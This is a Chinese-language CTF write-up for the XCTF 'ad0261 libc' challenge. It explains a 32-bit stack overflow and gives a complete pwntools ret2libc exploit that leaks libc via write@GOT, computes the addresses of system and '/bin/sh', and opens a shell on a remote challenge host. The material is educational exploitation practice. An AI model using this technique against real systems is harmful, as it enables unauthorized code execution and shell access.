#### [ad0261 libc](https://adworld.xctf.org.cn/media/file/task/bed0c68697f74e649f3e1c64ff7838b8)
1. 分析过程
   查看main函数，基本啥也没有：
   ```c
   int __cdecl main()
    {
        char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF

        strcpy(buf, "Welcome to XDCTF2015~!\n");
        memset(&buf[24], 0, 0x4Cu);
        setbuf(stdout, buf);
        write(1, buf, strlen(buf));
        sub_8048484();
        return 0;
    }
   ```
   溢出点在sub_8048484()里面,buf只有108，但是读取0x100（256），可以溢出覆盖返回地址：
   ```c
   ssize_t sub_8048484()
    {
        char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF

        setbuf(stdin, buf);
        return read(0, buf, 0x100u);    // 溢出点
    }
   ```
   ```
   -0000006C buf             db ?
   ...
   -00000001                 db ? ; undefined
   +00000000  s              db 4 dup(?)
   +00000004  r              db 4 dup(?)
   +00000008
   +00000008 ; end of stack variables
   ```
   但是此时在plt表中搜索system发现不存在，不过main函数中有write函数，可以用来输出libc相关信息。
   总结思路：
   第一轮准备工作输出libc基地址，将返回地址设置为plt_write函数，并将write函数输出got_write里记录的write_addr，最后将write函数返回地址设置为main，方便下一轮正式pwn溢出。
   第二轮，根据已有的write_addr，结合偏移量libc.dump("write")，可以计算出基地址libc_base=write_addr-libc.dump("write")。然后可以计算出system地址system_addr=libc_base+libc.dump("system")。
   （存疑）然后/bin/sh的地址也可以在libc里面找到，binsh_addr=libc_base+libc.dump('str_bin_sh')。
   后面就正常按照system函数压栈即可。
2. exp.py
    ```python
    from pwn import *
    from LibcSearcher import *   # 因为题目没有提供libc.so，所以用匹配库匹配一下
    io = process('./pwn')
    io = remote('61.147.171.105','63827')
    elf = ELF("./pwn")           # 读取pwn里write函数的plt和got地址
    write_plt = elf.plt['write']
    write_got = elf.got['write']
    main_addr = 0x80484BE
    payload = b'a'*(0x6c+0x4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    io.recvuntil(b"Welcome to XDCTF2015~!\n")           # 首先填充至返回地址，将返回地址设为write_plt
    io.sendline(payload)                                # 然后根据weirte的调用栈结构，打印4字节write_got指向的内容
    write_addr = u32(io.recv(4))                        # 从交互中获取上述write真实地址 
    print("write_addr", hex(write_addr))
    
    '''
    # 这道题只能打通本地，打不通远程……痛苦啊            
    libc = LibcSearcher('write', write_addr)            # 根据write的真实地址自动识别libc版本（不一定准确）
    libc_base = write_addr - libc.dump("write")         # 计算基地址
    system_addr = libc_base + libc.dump("system")       # 计算system的真实地址
    binsh_addr = libc_base + libc.dump('str_bin_sh')    # 计算bin_sh的真实地址
    ''' 
    # 本地运行版本
    libc = ELF("./libc_32.so.6")                       # 查看本地libc版本 $ ldd pwn 
    libc_base = write_addr - libc.sym["write"]         # 计算基地址
    system_addr = libc_base + libc.sym["system"]       # 计算system的真实地址
    binsh_addr = libc_base + 0x001b5fc8                # $ ROPgadget --binary libc_32.so.6 --string '/bin/sh'
    
    print("system_addr", hex(system_addr))
    print("binah_addr", hex(binsh_addr))

    payload = b'a'*(0x6c+0x4) + p32(system_addr) +p32(main_addr) + p32(binsh_addr)
    io.recvuntil(b"Welcome to XDCTF2015~!\n")           # 根据正常system调用栈结构填写pwn
    io.sendline(payload)         
    io.interactive()           
    ```
